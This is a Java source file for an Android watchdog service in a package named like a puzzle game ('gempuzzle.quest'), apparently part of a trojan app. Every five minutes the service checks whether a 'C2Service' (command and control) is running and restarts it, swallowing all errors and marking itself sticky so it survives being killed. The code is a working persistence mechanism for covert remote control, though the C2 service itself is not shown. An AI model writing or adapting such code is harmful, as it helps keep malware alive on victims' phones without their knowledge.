package com.gempuzzle.quest.c2;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.annotation.Nullable;

/**
 * Watchdog service — runs in :wd process. Every 5 minutes
 * checks if C2Service is alive; if not, restarts it.
 */
public class WatchdogService extends Service {

    private Handler handler;
    private Runnable tick;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        tick = new Runnable() {
            @Override
            public void run() {
                if (!isC2Running(WatchdogService.this)) {
                    try {
                        Intent svc = new Intent(WatchdogService.this, C2Service.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(svc);
                        } else {
                            startService(svc);
                        }
                    } catch (Throwable ignored) {}
                }
                handler.postDelayed(this, 5 * 60 * 1000);
            }
        };
        handler.postDelayed(tick, 60 * 1000);
    }

    private boolean isC2Running(Context ctx) {
        android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
        for (android.app.ActivityManager.RunningServiceInfo rs : am.getRunningServices(100)) {
            if (rs.service.getClassName().endsWith("C2Service")) return true;
        }
        return false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (handler != null && tick != null) handler.removeCallbacks(tick);
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
